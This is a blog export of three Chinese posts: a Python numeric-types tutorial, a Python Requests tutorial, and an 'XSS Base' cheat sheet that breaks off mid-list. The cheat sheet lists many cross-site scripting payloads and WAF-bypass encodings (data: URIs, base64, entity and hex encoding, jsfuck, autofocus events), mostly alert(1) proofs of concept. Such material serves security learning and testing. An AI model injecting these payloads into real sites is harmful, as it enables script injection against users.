在这里3是实数部分，5i为虚数部分 Python：3+5j － 现实里的i换成“j”或者“J”来表示。 在Python里还有一种表示方式是函数格式：complex(3,5) &gt;&gt;&gt; a = 3+5j &gt;&gt;&gt; b = 3+5J &gt;&gt;&gt; c = complex(3,5) &gt;&gt;&gt; a==b True &gt;&gt;&gt; c==b True &gt;&gt;&gt; c==a True 其他在一些特殊场景，我们会需要特殊的数字类型：分数在Python里使用Fraction函数来表示分数： &gt;&gt;&gt; from fractions import * &gt;&gt;&gt; print(Fraction(4,5)) 4/5 无穷大，无穷小 float(‘inf’)是无穷大 float(‘-inf’)是无穷小 &gt;&gt;&gt; 1/float(&apos;inf&apos;) 0.0 &gt;&gt;&gt; 1/float(&apos;-inf&apos;) -0.0 各类运算符各类运算符算数运算符：+,-,*,/,%,//,** 比较运算符：==,!=,&gt;,&lt;,&gt;=,&lt;= 赋值运算符：=,+=,-=,*=,/=,%=,//=,**= 位运算符：&amp;,|,^,~,&lt;&lt;,&gt;&gt; 逻辑运算符：and,or,not 成员运算符：in, not in 身份运算符：is, is not 运算符优先级：• ** • ~,+,- #这里的加和减是一元运算符 • *,/,%,// • +,- • &lt;&lt;,&gt;&gt; • &amp; • ^,| • &lt;=,&gt;=,&lt;,&gt; • ==,!= • =,+=,-=,*=,/=,%=,//=,**= ----------------------------------------- • is, is not • in, not in • and, or, not 运算符应用类型升级&gt;&gt;&gt; a = 10 &gt;&gt;&gt; b = 3.14 &gt;&gt;&gt; c = 1+2j &gt;&gt;&gt; d = Fraction(3,4) &gt;&gt;&gt; a+b 13.14 &gt;&gt;&gt; a+c (11+2j) &gt;&gt;&gt; a+d Fraction(43, 4) &gt;&gt;&gt; b+c (4.140000000000001+2j) &gt;&gt;&gt; b+d 3.89 &gt;&gt;&gt; c+d (1.75+2j) &gt;&gt;&gt; 基本数学函数基本数学函数pow：幂函数 abs：绝对值 fabs：绝对值（与abs稍微有区别）(math) round：四舍五入（2.x和3.x结果略不同） ceil，floor：取整(math) int,bin,oct,hex,float等：格式转换 random：随机函数(random) cmp：比较函数(*2.x) log：算出自然对数(math) log10：算出底数为10的对数(math) max，min：选出最大，最小值 modf：对浮点数分成小数部分和整数部分（math） sqrt：算出平方根 数学函数的应用int,bin,oct,hex,float: 从10进制转化为其他进制：bin,oct,hex 这些函数是需要转换进制的时候使用 &gt;&gt;&gt; bin(10) //二进制 &apos;0b1010&apos; &gt;&gt;&gt; oct(10) //八进制 &apos;012&apos; &gt;&gt;&gt; hex(10) //十六进制 &apos;0xa&apos; 把整数转化为浮点数 float&gt;&gt;&gt; float(1) 1.0 int 非十进制的文本转化为Python里的十进制数值时使用：&gt;&gt;&gt; int(&apos;0b10000000&apos;,2) 128 &gt;&gt;&gt; int(&apos;0o777&apos;,8) 511 &gt;&gt;&gt; int(&apos;0xffff&apos;,16) 65535 也支持浮点数转化为整数，是把小数部分去掉 &gt;&gt;&gt; int(2.8) 2 &gt;&gt;&gt; int(-2.2) -2 pow，sqrt，max，min，abs，fabspow：幂函数，功能与运算符**一样 &gt;&gt;&gt; pow(2,10) 1024 sqrt：区当前数的平方根 &gt;&gt;&gt; math.sqrt(16) 4.0 max：最大值与min：最小值 &gt;&gt;&gt; max(5,33,52,75,22) 75 &gt;&gt;&gt; min(2,3,66,44,1,88,65) 1 abs与fabs：取绝对值 &gt;&gt;&gt; abs(-1) 1 &gt;&gt;&gt; math.fabs(-1) 1.0 同样是取绝对值，但是fabs函数取出来的 是浮点数，abs可以保持原有的数字类型 ound,ceil,floorround：四舍五入？ 这个函数在2.x和3.x版本有区别 Python2.x上的结果： &gt;&gt;&gt; round(2.5) 3 Python 3.x上的结果 &gt;&gt;&gt; round(2.5) 2 在3.x里这个函数有变化，当要舍弃的数值正好为5（中间）时，会取接近的偶数 值。但你要是取小数点以下几位时可能结果并不是你想象的。后面解释。 ceil：取最小的大于该值的最大整数(向上取整) &gt;&gt;&gt; math.ceil(3.7) 4.0 floor() 向下取整 &gt;&gt;&gt; math.floor(3.7) 3.0 注意：floor()是不能直接访问的，需要导入 math 模块，通过静态对象调用该方法。 cmp: 在Python 2.x里提供了很好的比较函数：cmp(),当前面的数值小，结果是-1；一样的时 候结果为0，前面的数值大的时候结果为1。但是Python 3.x里很可惜舍弃了这个函数 &gt;&gt;&gt; cmp(1,2) -1 &gt;&gt;&gt; cmp(2,2) 0 &gt;&gt;&gt; cmp(3,2) 1 random:在Python 里提供了很好的随机函数使用的模块：random。其使用方法如下： 1、取0-1之间的随机小数： &gt;&gt;&gt; random.random() 0.6138605923784588 2、取自定义数里的随机数(多个元素）： &gt;&gt;&gt; random.choice((1,2,3,4,5)) 4 &gt;&gt;&gt; random.choice((1,2,3,4,5)) 5 &gt;&gt;&gt; random.sample((1,2,3,4,5),2) [5, 4] 3、随机打乱顺序 &gt;&gt;&gt; a = [1,2,3,4,5] &gt;&gt;&gt; random.shuffle(a) &gt;&gt;&gt; a [4, 3, 2, 1, 5] 4、获取N位随机数（二进制）： random.getrandbits(5) 31L modf:此函数是把浮点数的整数位和小数位 单独取出来： &gt;&gt;&gt; math.modf(2.5) (0.5, 2.0) 在这里会发现整数部分也是浮点数，而不是整数 log：此函数为指数函数。 默认e为底数， 结果为浮点数。 log10以10为底数。可 以自定义底数。 &gt;&gt;&gt; math.log(2) 0.6931471805599453 &gt;&gt;&gt; math.log(4,2) 2.0 &gt;&gt;&gt; math.log10(100) 2.0 round与格式化输出： 当输出以一定的格式来输出的时候，比如：a的值是2.5和2.335，2.345的时候，我们 只需要小数点之后两位，这个时候不会使用round函数来进行所谓的“四舍五入”， 两者也会有点区别。 Python 2.x: &gt;&gt;&gt; round(2.5) 3.0 &gt;&gt;&gt; format(2.5,&apos;0.0f&apos;) &apos;2&apos; &gt;&gt;&gt; round(2.335,2) 2.33 &gt;&gt;&gt; format(2.335,&apos;0.2f&apos;) &apos;2.33&apos; &gt;&gt;&gt; round(2.345,2) 2.35 &gt;&gt;&gt; format(2.345,&apos;0.2f&apos;) &apos;2.35&apos; Python 3.x: &gt;&gt;&gt; round(2.5) 2.0 &gt;&gt;&gt; format(2.5,&apos;0.0f&apos;) &apos;2&apos; &gt;&gt;&gt; round(2.335,2) 2.33 &gt;&gt;&gt; format(2.335,&apos;0.2f&apos;) &apos;2.33&apos; &gt;&gt;&gt; round(2.345,2) 2.35 &gt;&gt;&gt; format(2.345,&apos;0.2f&apos;) &apos;2.35&apos; Decimal模块： 在使用浮点数的时候，因为计算机里是使用二进制来表示，所以会出现精度问题， 当金融行业等不许出现一丝问题的时候，我们会使用Decimal模块来解决精度问题。 &gt;&gt;&gt; a=2.1 &gt;&gt;&gt; b=4.2 &gt;&gt;&gt; a+b 6.300000000000001 &gt;&gt;&gt; a=Decimal(&apos;2.1&apos;) &gt;&gt;&gt; b=Decimal(&apos;4.2&apos;) &gt;&gt;&gt; a+b Decimal(&apos;6.3&apos;) 格式化输出－format： 使用bin(),oct(),hex()的时候会发现前面会加0b，0o，0x。 我们不想要前缀的时候可以 使用format函数来解决： &gt;&gt;&gt; a=13 &gt;&gt;&gt; bin(a) &apos;0b1101&apos; &gt;&gt;&gt; oct(a) &apos;0o15&apos; &gt;&gt;&gt; hex(a) &apos;0xd&apos; &gt;&gt;&gt; format(a,&apos;b&apos;) &apos;1101&apos; &gt;&gt;&gt; format(a,&apos;o&apos;) &apos;15&apos; &gt;&gt;&gt; format(a,&apos;x&apos;) &apos;d&apos;]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Python基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python安全之Requests学习]]></title>
    <url>%2F2018%2F08%2F09%2FPython-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-01-Requests%2F</url>
    <content type="text"><![CDATA[Python安全 Requests学习简介开发哲学Beautiful is better than ugly.(美丽优于丑陋) Explicit is better than implicit.(直白优于含蓄) Simple is better than complex.(简单优于复杂) Complex is better than complicated.(复杂优于繁琐) Readability counts.(可读性很重要) Apache2 协议Requests 协议功能特性Requests 完全满足今日 web 的需求。 Keep-Alive &amp; 连接池 国际化域名和 URL 带持久 Cookie 的会话 浏览器式的 SSL 认证 自动内容解码 基本/摘要式的身份认证 优雅的 key/value Cookie 自动解压 Unicode 响应体 HTTP(S) 代理支持 文件分块上传 流下载 连接超时 分块请求 支持 .netrc Requests 支持 Python 2.6—2.7以及3.3—3.7，而且能在 PyPy 下完美运行。 安装Requestspip install requests -i https://mirror.aliyun.com/pypi/simple 快速上手发送请求导入Requests模块 import requests 各种请求方法 r = requests.get(&apos;https://http://httpbin.org/get&apos;) r = requests.post(&apos;http://httpbin.org/post&apos;,data={&apos;key&apos;:&apos;value&apos;}) r = requests.put(&apos;http://httpbin.org/put&apos;,data={&apos;key&apos;:&apos;value&apos;}) r = requests.delete(&apos;http://httpbin.org/delete&apos;) r = requests.head(&apos;http://httpbin.org/get&apos;) r = requests.options(&apos;http://httpbin.org/get&apos;) 传递URL参数为URL的查询字符串传递某种数据，数据以键/值对的形式置于URL中，跟在一个问号后面 httpbin.org/get?key=val Requests允许使用params关键字参数，以一个字符串字典来提供这些参数。 传递 key1=value1和key2=value2到httpbin.org/get &gt;&gt;&gt; payload = {&apos;key1&apos;: &apos;value1&apos;, &apos;key2&apos;: &apos;value2&apos;} &gt;&gt;&gt; r = requests.get(&quot;http://httpbin.org/get&quot;, params=payload) 打印输出该URL &gt;&gt;&gt; print(r.url) http://httpbin.org/get?key2=value2&amp;key1=value1 注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。将一个列表作为值传入： &gt;&gt;&gt; payload = {&apos;key1&apos;: &apos;value1&apos;, &apos;key2&apos;: [&apos;value2&apos;, &apos;value3&apos;]} &gt;&gt;&gt; r = requests.get(&apos;http://httpbin.org/get&apos;, params=payload) &gt;&gt;&gt; print(r.url) http://httpbin.org/get?key2=value2&amp;key2=value3&amp;key1=value1 二进制响应内容读取服务器端响应的内容 &gt;&gt;&gt; import requests &gt;&gt;&gt; r = requests.get(&apos;http://httpbin.org/get&apos;) &gt;&gt;&gt; r.text { &quot;args&quot;: {}, &quot;headers&quot;: { &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests/2.19.1&quot; }, &quot;origin&quot;: &quot;223.104.170.227&quot;, &quot;url&quot;: &quot;http://httpbin.org/get&quot; } 编码属性 r.encoding设置文本编码属性 r.encoding = &apos;ISO-8859-1&apos; 如果你改变了编码，每当你访问 r.text ，Request 都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding 为相应的编码。这样就能使用正确的编码解析 r.text 了. 以字节的方式访问请求响应体 r.content Requests 会自动为你解码 gzip 和 deflate 传输编码的响应数据。 JSON响应内容Requests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据： import requests r = requests.get(&apos;http://httpbin.org/get&apos;) print r.json() {u&apos;origin&apos;: u&apos;223.104.170.227&apos;, u&apos;headers&apos;: {u&apos;Connection&apos;: u&apos;close&apos;, u&apos;Host&apos;: u&apos;httpbin.org&apos;, u&apos;Accept-Encoding&apos;: u&apos;gzip, deflate&apos;, u&apos;Accept&apos;: u&apos;*/*&apos;, u&apos;User-Agent&apos;: u&apos;python-requests/2.19.1&apos;}, u&apos;args&apos;: {}, u&apos;url&apos;: u&apos;http://httpbin.org/get&apos;} 原始响应内容获取来自服务器的原始套接字响应 r.raw 在初始请求中设置stream=True r = requests.get(&apos;https://httpbin.org/get&apos;,stream=True) print r.raw &lt;urllib3.response.HTTPResponse object at 0x0000000003D1F5C0&gt; 定制请求头为请求添加HTTP头部，使用字典给headers传递参数 import requests url = &apos;https://httpbin.org/get&apos; headers = {&apos;user-agent&apos;:&apos;my-app/0.0.1&apos;} r = requests.get(url,headers=headers) print r.text { &quot;args&quot;: {}, &quot;headers&quot;: { &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;my-app/0.0.1&quot; }, &quot;origin&quot;: &quot;223.104.34.96&quot;, &quot;url&quot;: &quot;https://httpbin.org/get&quot; } 注意: 所有的 header 值必须是 string、bytestring 或者 unicode。尽管传递 unicode header 也是允许的，但不建议这样做。 更加复杂的POST请求发送一些编码为表单形式的数据，通过传递一个字典data参数，数据字典在发出请求时自动编码为表单形式 payload = {&apos;key1&apos;:&apos;value1&apos;,&apos;key2&apos;:&apos;value2&apos;} r = requests.post(&quot;http://httpbin.org/post&quot;,data = payload) print(r.text) { &quot;args&quot;: {}, &quot;data&quot;: &quot;&quot;, &quot;files&quot;: {}, &quot;form&quot;: { &quot;key1&quot;: &quot;value1&quot;, &quot;key2&quot;: &quot;value2&quot; }, &quot;headers&quot;: { &quot;Accept&quot;: &quot;*/*&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Length&quot;: &quot;23&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests/2.19.1&quot; }, &quot;json&quot;: null, &quot;origin&quot;: &quot;223.104.34.96&quot;, &quot;url&quot;: &quot;http://httpbin.org/post&quot; } 为data参数传入一个元组列表，在表单中多个元素使用同一key的时候，尤为有效 payload = ((&apos;key1&apos;,&apos;value1&apos;),(&apos;key1&apos;,&apos;value2&apos;)) r = requests.post(&apos;http://httpbin.org/post&apos;,data=payload) print(r.text) { &quot;args&quot;: {}, &quot;data&quot;: &quot;&quot;, &quot;files&quot;: {}, &quot;form&quot;: { &quot;key1&quot;: [ &quot;value1&quot;, &quot;value2&quot; ] }, &quot;headers&quot;: { &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Length&quot;: &quot;23&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests/2.19.1&quot; }, &quot;json&quot;: null, &quot;origin&quot;: &quot;223.104.34.96&quot;, &quot;url&quot;: &quot;http://httpbin.org/post&quot; } 很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict，那么数据会被直接发布出去。 import json url = &apos;https://api.github.com/some/endpoint&apos; payload = {&apos;some&apos;:&apos;data&apos;} r = requests.post(url,data=json.dumps(payload)) 除了可以自行对 dict 进行编码，你还可以使用 json 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能： import json url = &apos;https://api.github.com/some/endpoint&apos; payload = {&apos;some&apos;:&apos;data&apos;} r = requests.post(url,data=json.dumps(payload)) print r.text POST一个多部分编码的文件Requests 使得上传多部分编码文件变得很简单 url = &apos;http://httpbin.org/post&apos; files = {&apos;file&apos;:open(&apos;report.xls&apos;,&apos;rb&apos;)} r = requests.post(url,proxies=proxies,verify=False,files=files) r.text 可以显示地设置文件名，文件类型和请求头： url = &apos;http://httpbin.org/post&apos; files = {&apos;file&apos;:(&apos;report.xls&apos;,open(&apos;report.xls&apos;,&apos;rb&apos;),&apos;application/vnd.ms-excel&apos;,{&apos;Expires&apos;:&apos;0&apos;})} r = requests.post(url,proxies=proxies,verify=False,files=files) r.text 也可以发送作为文件来接收的字符串 url = &apos;http://httpbin.org/post&apos; files = {&apos;file&apos;:(&apos;report.csv&apos;,&apos;some,data,to,send\nanother,row,to,send\n&apos;)} r = requests.post(url,proxies=proxies,files=files) r.text 请求如下 POST /post HTTP/1.1 Host: httpbin.org Connection: close Accept: */* User-Agent: python-requests/2.19.1 Content-Length: 184 Content-Type: multipart/form-data; boundary=8511d039a04c9bce4ac34eb58060d326 --8511d039a04c9bce4ac34eb58060d326 Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;report.csv&quot; some,data,to,send another,row,to,send --8511d039a04c9bce4ac34eb58060d326-- 如果发送一个非常打的文件作为multipart/form-data请求，想把请求做成数据流。默认下requests不支持，但是有第三方包requests-toolbelt是支持的 响应状态码检测响应状态码 r = requests.get(&apos;http://httpbin.org/get&apos;) r.tatus_code 200 为了方便引用，Requests还附带了一个内置的状态码查询对象: r.status_code == requests.codes.ok True 如果发送了一个错误请求(一个 4XX 客户端错误，或者 5XX 服务器错误响应)，我们可以通过 Response.raise_for_status() 来抛出异常： bad_r = requests.get(&apos;http://httpbin.org/status/404&apos;) print bad_r.status_code 404 bad_r.raise_for_status() requests.exceptions.HTTPError: 404 Client Error: 响应头可以查看以一个python字典形式展示的服务器响应头 r = requests.get(&apos;http://httpbin.org/get&apos;) print r.headers { &apos;Content-Length&apos;: &apos;266&apos;, &apos;Via&apos;: &apos;1.1 vegur&apos;, &apos;Server&apos;: &apos;gunicorn/19.9.0&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;Access-Control-Allow-Credentials&apos;: &apos;true&apos;, &apos;Date&apos;: &apos;Thu, 09 Aug 2018 02:41:29 GMT&apos;, &apos;Access-Control-Allow-Origin&apos;: &apos;*&apos;, &apos;Content-Type&apos;: &apos;application/json&apos; } 但是这个字典比较特殊：它是仅为 HTTP 头部而生的。根据 RFC 2616， HTTP 头部是大小写不敏感的。 因此，我们可以使用任意大写形式来访问这些响应头字段： r = requests.get(&apos;http://httpbin.org/get&apos;) print r.headers[&apos;Content-Type&apos;] application/json r = requests.get(&apos;http://httpbin.org/get&apos;) print r.headers[&apos;content-type&apos;] application/json 它还有一个特殊点，那就是服务器可以多次接受同一 header，每次都使用不同的值。但 Requests 会将它们合并，这样它们就可以用一个映射来表示出来，参见 RFC 7230 Cookie如果某个响应中包含一些cookie，通过下面方式快速访问 发送cookies到服务器，可以使用cookies参数： url = &apos;http://httpbin.org/cookies&apos; cookies = dict(cookie_are=&apos;working&apos;) r = requests.get(url,cookies=cookies) print r.text { &quot;cookies&quot;: { &quot;cookie_are&quot;: &quot;working&quot; } } Cookie 的返回对象为 RequestsCookieJar，它的行为和字典类似，但接口更为完整，适合跨域名跨路径使用。你还可以把 Cookie Jar 传到 Requests 中： jar = requests.cookies.RequestsCookieJar() jar.set(&apos;tasty_cookie&apos;,&apos;yum&apos;,domain=&apos;httpbin.org&apos;,path=&apos;/cookies/&apos;) jar.set(&apos;gross_cookie&apos;,&apos;blech&apos;,domain=&apos;httpbin.org&apos;,path=&apos;/elsewhere&apos;) url = &apos;http://httpbin.org/cookies&apos; r = requests.get(url,cookies=jar) print r.text { &quot;cookies&quot;: {&quot;tasty_cookie&quot;:&quot;yum&quot;} } 重定向与请求历史默认情况下，除了 HEAD, Requests 会自动处理所有重定向。 可以使用响应对象的 history 方法来追踪重定向。 Response.history 是一个 Response 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。 例如，GitHub将所有的HTTP请求重定向到HTTPS r = requests.get(&apos;http://github.com&apos;) print r.url https://github.com/ r.status_code r.history https://github.com/ 200 [&lt;Response [301]&gt;] 如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 allow_redirects 参数禁用重定向处理： r = requests.get(&apos;http://github.com&apos;,allow_redirects=False) print r.status_code print r.history 301 [] 如果使用了HEAD，可以启用重定向: r = requests.head(&apos;http://github.com&apos;,allow_redirects=True) print r.url print r.history https://github.com/ [&lt;Response [301]&gt;] 超时可以告诉 requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应： r = requests.head(&apos;http://github.com&apos;,timeout=0.1) requests.exceptions.ConnectTimeout: HTTPConnectionPool(host=&apos;github.com&apos;, port=80): 注意timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out. 错误与异常遇到网络问题（如：DNS 查询失败、拒绝连接等）时，Requests 会抛出一个 ConnectionError 异常。 如果 HTTP 请求返回了不成功的状态码， Response.raise_for_status() 会抛出一个 HTTPError 异常。 若请求超时，则抛出一个 Timeout 异常。 若请求超过了设定的最大重定向次数，则会抛出一个 TooManyRedirects 异常。 所有Requests显式抛出的异常都继承自 requests.exceptions.RequestException 练习#coding:utf-8 #auther：Ahodor import requests import sys url = &quot;https://www.baidu.com&quot; #代理 proxies = { &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;, &quot;https&quot;:&quot;https://127.0.0.1:8080&quot;, } headers = {&apos;user-agent&apos;:&apos;my-aasjkfsjfgjl/0.0.1&apos;,&apos;asnk&apos;:&apos;test for headers&apos;} cookies = dict(cookies_arg=&apos;working&apos;) r = requests.get(url,proxies=proxies,verify=False,headers=headers,cookies=cookies) #响应码 print r.status_code #查看响应内容 print r.text print r.content #重定向 r = requests.get(url,allow_redirects=False) print r.history #修改系统默认编码格式 reload(sys) sys.setdefaultencoding(&apos;utf-8&apos;) #查看请求头 print r.request.headers #查看请求参数 print r.request.body #查看响应头 print r.headers #保存返回的结果 fh = open(&quot;abc.png&quot;,&apos;w&apos;) fh.write(r.content) fh.close() #查看返回的编码格式 print r.encoding #更改返回的编码格式 r.encoding = &apos;utf-8&apos; #获得响应头里的cookies print r.cookies #如何发送post请求 payload = {&apos;name&apos;:&apos;Ahodor&apos;,&apos;age&apos;:&apos;12&apos;} r = requests.post(&quot;https://&quot;,data=payload) #设置超时 r = requests.get(url,timeout=5) r = requests.get(url,timeout=None) #使用session conn = requests.session() r = conn.get(url) print r.request.headers r = conn.get(url) print r.request.headers 高级用法身份认证在GitHub中搜索关键字这里尝试简单搜索 baidu #auther：Ahodor import requests import json key = &quot;baidu&quot; url = &quot;https://api.github.com/search/code?q=%s&quot; % key TOKEN = &quot;d39xxxxxxxxxx061b6b10e2c1e0331xxxxxxxxxx&quot; headers = {&quot;Authorization&quot;:&quot;token %s&quot; % TOKEN} params = {&quot;per_page&quot;:10,&quot;page&quot;:0} r = requests.get(url,headers=headers,params=params) d = r.json() print json.dumps(d,indent=4) 参考快速上手-Requests 2.18.1文档 高级用法-Requests 2.18.1文档 GitHub认证API使用 GitHub搜索API使用]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Requests</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS Base]]></title>
    <url>%2F2018%2F08%2F03%2FXSS-base%2F</url>
    <content type="text"><![CDATA[XSS Base能够执行js的标签、事件、属性标签&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt; 所有的event事件都可以执行jsonload onunload onchange onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop 可以执行js的属性formaction action href xlink:href autofocus src content data xss绕过方式自定义标签&lt;M/onclick=&quot;alert(1)&quot;&gt;M / 代替 空格在标签和属性之间不一定只能出现空格,使用/代替空格 &lt;img/src=x onerror=alert(1)&gt; 最短字符a标签1、通过JavaScript伪造协议来调用js &lt;a href=javascript:alert(1)&gt;A 2、通过data协议来执行JavaScript，进一步的话可以对payload进行编码（base64，urlencode,hex,demical,html实体编码）(不进行编码也是可以的) &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt; //base64解码为&lt;script&gt;alert(1)&lt;/script&gt; &lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M &lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M &lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt; &lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;M 各种编码绕过百分之百分号把%给url编码成%25，如果在后台对参数有再次进行urldecode，或者输出时有urldecode那么就可以绕过WAF， base64编码绕过不过滤&lt;&gt;但过滤script 和事件操作 onxxxx的时候，使用base64编码来绕过 &lt;iframe src=”data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0X2lmcmFtZScpPC9zY3JpcHQ+”&gt; HTML实体编码的利用绕过waf&lt;a href= ‘javascript:alert&amp;#40;&amp;#39;123&amp;#39;&amp;#41; ‘&gt;Hello&lt;/a&gt; &lt;a href= “j&amp;#97;vascript:alert&amp;#40; ’123′ &amp;#41;“&gt;Hello&lt;/a &gt; &lt;a href= “j&amp;#97;vascript:alert&amp;#0000040; ’123′ &amp;#41;“&gt;Hello&lt;/a &gt; &lt;a href= “j&amp;#97vascript:alert&amp;#0000040’123′ &amp;#41“&gt;Hello&lt;/a &gt; 在标签内的所有伪协议JS代码都是可以不用双引号包裹的 eval函数eval函数认识\x十六进制\八进制\uunicode码（记得使用引号） &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\x6c\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\u0091\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\154\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; script标签1、jsfuck编码 http://www.jsfuck.com/ &lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt; 2、不规范的script标签 &lt;script firefox&gt;alert(1)&lt;/script&gt; 3、可以用”/“来代替单引号和双引号 script&gt;alert(/3/)&lt;/script&gt; 4、如果输出是在setTimeout里，我们依然可以直接执行alert(1) &lt;script&gt;setTimeout(&apos;alert(1)&apos;,0)&lt;/script&gt; 5、不只是alert。prompt和confirm也可以弹窗 &lt;script&gt;prompt(-[])&lt;/script&gt; 6、各种编码方式 &lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt; button标签1、通过event事件来实现 &lt;button/onclick=alert(1)&gt;M&lt;/button&gt; 2、如果on(event)被过滤了 &lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;M 加上autofocus自动弹窗，无需交互 &lt;button onfocus=alert(1) autofocus&gt; p标签如果变量输出在p标签里，不一定要跳出标签，只要跳出””即可 &lt;p/onmouseover=javascript:alert(1);&gt;M&lt;/p&gt; img标签&lt;img src=x onerror=alert(1)&gt; &lt;img src ?itworksonchrome&gt;\/onerror = alert(1)&gt; //只在chrome下有效 &lt;img src=x onerror=window.open(&apos;http://google.com&apos;);&gt; &lt;img/src/onerror=alert(1)&gt; //只在chrome下有效 &lt;img src=&quot;x:test&quot; onerror=&quot;alert(1)&quot;&gt; body标签通过使用event来调用 &lt;body onload=alert(1)&gt; &lt;body onscroll=alert(1)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; var标签&lt;var onmouseover=&quot;prompt(1)&quot;&gt;test&lt;/var&gt; div标签&lt;div/onmouseover=&apos;alert(1)&apos;&gt;test &lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onclick=&quot;alert(1)&quot;&gt; iframe标签形式 iframe 的src属性本来应该是一个网址，但是它同样可以执行javascript onload执行js: &lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt; src执行javascript代码 &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; IE下vbscript执行代码: &lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt; Chrome下data协议执行代码： &lt;iframesrc=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;Chrome 上面的变体 &lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; Chrome下srcdoc属性 &lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; meta标签跳出当前属性在添加http-equiv=”refresh”，或者通过给http-equiv设置set-cookie来，进一步重新设置cookie &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;? &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt; object标签和a标签的href属性玩法是一样的，不过优点是无须交互 &lt;object&gt; 